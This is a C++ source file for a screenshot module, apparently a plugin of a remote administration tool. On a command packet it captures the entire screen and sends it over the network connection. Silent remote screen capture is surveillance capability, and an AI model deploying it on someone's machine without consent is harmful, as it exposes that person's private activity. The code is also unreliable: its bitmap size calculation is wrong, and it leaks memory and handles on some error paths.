#include "screenshot.h"


Screenshot::Screenshot(Connection* mConnObj)
{
	ConnObj = mConnObj;
}

Screenshot::~Screenshot() {};

void Screenshot::OnInit()
{
    objID = 4;
}

void Screenshot::OnPacketArrived(BYTE* packet, size_t Size)
{
    if (packet[0] == 1)
        CapureScreenshotAndSend();
}

void Screenshot::OnExit()
{
    return;
}

bool Screenshot::CapureScreenshotAndSend()
{
	HDC hScreenDC = GetDC(NULL);
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    bool ret = false;

    int iXRes = GetSystemMetrics(SM_CXVIRTUALSCREEN) - GetSystemMetrics(SM_XVIRTUALSCREEN);
    int iYRes = GetSystemMetrics(SM_CYVIRTUALSCREEN) - GetSystemMetrics(SM_YVIRTUALSCREEN);

	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, iXRes, iYRes);
    if (hBitmap == NULL)
        goto Free_DC;

    if (!SelectObject(hMemoryDC, hBitmap))
        goto Free_DC;

    if (!StretchBlt(hMemoryDC, 0, 0, iXRes, iYRes, hScreenDC, 0, 0, iXRes, iYRes, SRCCOPY))
        goto Free_DC;

	BITMAP bmpScreen;
    // Get the BITMAP from the HBITMAP
    if (!GetObject(hBitmap, sizeof(BITMAP), &bmpScreen))
        goto Free_DC;

    WORD biBitCount = bmpScreen.bmPlanes * bmpScreen.bmBitsPixel;
    if (biBitCount == 1)
        biBitCount = 1;
    else if (biBitCount <= 4)
        biBitCount = 4;
    else if (biBitCount <= 8)
        biBitCount = 8;
    else if (biBitCount <= 16)
        biBitCount = 16; // ignore 24 case
    else biBitCount = 32;

    DWORD dwBmpSize = (bmpScreen.bmWidth + 7) / 8 * bmpScreen.bmHeight * biBitCount;
	
    //Now create bmp image
    int bmpSize = sizeof(BITMAPFILEHEADER) + (sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << biBitCount)) + dwBmpSize;
    char* packet = (char*)malloc(bmpSize + 1);
    char* bmpBuffer = packet + 1;
    ZeroMemory(bmpBuffer, bmpSize);
    BITMAPFILEHEADER*   bmfHeader = (BITMAPFILEHEADER*)bmpBuffer;
    BITMAPINFOHEADER*   bi = (BITMAPINFOHEADER*)(bmpBuffer + sizeof(BITMAPFILEHEADER));
    char* lpBitmap = bmpBuffer + sizeof(BITMAPFILEHEADER) + (sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << biBitCount));

    //Prepare Bitmap Info
    bi->biSize = sizeof(BITMAPINFOHEADER);
    bi->biWidth = bmpScreen.bmWidth;
    bi->biHeight = bmpScreen.bmHeight;
    bi->biPlanes = bmpScreen.bmPlanes;
    bi->biBitCount = bmpScreen.bmBitsPixel;
    bi->biCompression = BI_RGB;
    bi->biClrUsed = (1 << biBitCount);
    bi->biSizeImage = dwBmpSize;
    bi->biXPelsPerMeter = 0;
    bi->biYPelsPerMeter = 0;
    bi->biClrImportant = 0;

    //Prepare Bitmap file Header
    bmfHeader->bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + bi->biClrUsed *sizeof(RGBQUAD);
    bmfHeader->bfSize = bmpSize;
    bmfHeader->bfType = 0x4D42; //BM   

    //Copy bitmap
    if (!GetDIBits(hMemoryDC, hBitmap, 0, bi->biHeight, lpBitmap, (LPBITMAPINFO)bi, DIB_RGB_COLORS))
        return false;

    //Send bmp
    packet[0] = 0;
    ret = SendPacket((BYTE*)packet, bmpSize + 1);

    // Finally clean up
    free(packet);

Free_DC:
	DeleteDC(hMemoryDC);
	DeleteDC(hScreenDC);
    
    return ret;
}
